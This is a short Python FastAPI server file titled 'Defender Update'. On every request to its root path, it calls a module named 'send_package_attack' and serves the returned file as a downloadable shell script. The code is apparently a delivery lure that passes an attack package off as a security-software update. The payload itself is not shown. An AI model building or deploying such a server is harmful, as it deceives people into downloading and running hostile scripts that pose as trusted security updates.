from fastapi import FastAPI, APIRouter
from fastapi.responses import FileResponse
import src.utils.send_package_attack as spa

app = FastAPI(title="Defender Update", version="1.0.0")
route = APIRouter()


@route.get("/")
async def read_root():
    file_path, error = spa.send_package_attack()
    
    if error:
        return error
    
    return FileResponse(
        path=str(file_path),
        filename=file_path.name,
        media_type="application/x-sh"
    )

app.include_router(route)
